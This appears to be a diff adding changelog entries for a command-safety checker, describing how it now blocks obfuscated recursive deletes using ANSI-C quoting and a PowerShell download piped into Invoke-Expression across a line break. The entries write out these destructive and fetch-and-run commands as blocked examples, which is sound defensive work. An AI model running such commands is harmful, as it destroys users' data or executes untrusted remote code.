@@ -1,0 +1,3 @@
+### Security
+- The destructive-command check now also reads ANSI-C quoting (`$'...'`) when it looks for a recursive delete of the root or home folder, so `$'\x72m' -rf ~`, `rm -rf $'\x7e'` and `$'\162m' -rf /` are blocked. A literal `$'...'` that is only printed, as in `echo $'\x72m -rf ~'`, is still allowed.
+- The PowerShell reading of a download piped into `Invoke-Expression` now follows PowerShell 7 line continuation: a next line that starts with a pipe continues the command above it, so `iwr https://example.com/i.ps1` followed by a line `| iex` is blocked. A next line that pipes into something harmless, such as `| ConvertFrom-Json`, is still allowed.
